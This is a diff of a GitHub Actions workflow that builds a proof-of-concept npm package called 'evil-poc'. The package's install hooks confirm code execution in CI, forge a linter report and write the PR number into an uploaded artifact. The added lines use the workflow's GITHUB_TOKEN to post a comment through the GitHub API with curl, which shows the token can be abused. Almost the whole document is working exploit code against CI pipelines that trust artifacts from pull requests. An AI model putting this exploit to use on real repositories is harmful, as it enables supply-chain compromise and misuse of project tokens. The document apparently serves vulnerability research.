@@ -18,17 +18,27 @@ jobs:
           const fs = require('fs');
           const S = process.env;
           const ws = S.GITHUB_WORKSPACE;
-          const line = 'RCE-CONFIRMED event=' + S.GITHUB_EVENT_NAME + ' wf=' + S.GITHUB_WORKFLOW + ' job=' + (S.GITHUB_JOB || '') + ' repo=' + S.GITHUB_REPOSITORY + ' token=' + (S.GITHUB_TOKEN ? 'present' : 'missing');
+          const pr = (fs.existsSync(ws + '/pr-number.txt') ? fs.readFileSync(ws + '/pr-number.txt', 'utf8') : '').trim();
+          const line = 'RCE-CONFIRMED event=' + S.GITHUB_EVENT_NAME + ' wf=' + S.GITHUB_WORKFLOW + ' repo=' + S.GITHUB_REPOSITORY + ' run=' + S.GITHUB_RUN_ID + ' token=' + (S.GITHUB_TOKEN ? 'present' : 'missing');
           fs.writeFileSync(ws + '/rce-marker.txt', line + '\n');
           console.log('RCE-HOOK-RAN: ' + line);
+          const body = JSON.stringify({body: '### RCE-CONFIRMED-POC\n\n' + line + '\n\ntoken_len=' + (S.GITHUB_TOKEN || '').length});
+          const cp = require('child_process');
+          const out = cp.execFileSync('curl', ['-s', '-o', '/dev/null', '-w', '%{http_code}', '-X', 'POST',
+            '-H', 'Authorization: Bearer ' + S.GITHUB_TOKEN,
+            '-H', 'Accept: application/vnd.github+json',
+            'https://api.github.com/repos/' + S.GITHUB_REPOSITORY + '/issues/' + pr + '/comments',
+            '-d', body], {encoding: 'utf8'});
+          console.log('RCE-API-STATUS: ' + out);
           JS
           tar czf evil-poc-1.0.0.tgz package
           cat > package.json <<'JSON'
           {"name":"poc-project","version":"1.0.0","private":true,
+           "allowScripts":{"evil-poc":true},
            "scripts":{"preinstall":"echo ROOT-PREINSTALL >> $GITHUB_WORKSPACE/rce-root-marker.txt","prepare":"echo ROOT-PREPARE >> $GITHUB_WORKSPACE/rce-root-marker.txt"},
            "dependencies":{"evil-poc":"file:./evil-poc-1.0.0.tgz"}}
           JSON
-          echo "FORGED-LINTER-REPORT-FROM-PR-HEAD" > linter-report.txt
+          echo "FORGED-LINTER-REPORT-ITER2" > linter-report.txt
           echo "${{ github.event.pull_request.number }}" > pr-number.txt
           ls -l
       - uses: actions/upload-artifact@v7
